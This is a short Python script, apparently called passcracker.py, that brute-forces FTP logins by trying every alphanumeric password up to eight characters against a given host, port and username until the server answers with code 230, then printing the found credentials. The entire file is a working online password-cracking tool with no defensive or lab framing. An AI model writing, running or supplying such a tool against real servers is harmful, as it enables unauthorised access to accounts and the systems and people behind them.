import itertools
import string
import sys
import socket

def connection(ip, user, passw, port):
    s = socket.socket()
    s.connect((ip, int(port)))
    data = s.recv(1024)
    s.send(('USER ' + user + '\r\n').encode())
    data = s.recv(1024)
    s.send(('PASS ' + passw + '\r\n').encode())
    data = s.recv(1024)
    s.send(('quit\r\n').encode())
    s.close()
    return data
def crack(ip, user, port):
    chars = string.digits + string.ascii_letters
    for password_length in range(1, 9):
        for guess in itertools.product(chars, repeat = password_length):
            guess = ''.join(guess)
            p = connection(ip, user, guess, port)
            if '230'.encode() in p:
                print('Username : ' + user + '\nPassword : ' + guess)
                sys.exit(1)
if len(sys.argv) != 4:
    print('Usage: ./passcracker.py <IP> <Username> <Port>')
    sys.exit(1)
crack(sys.argv[1], sys.argv[2], sys.argv[3])
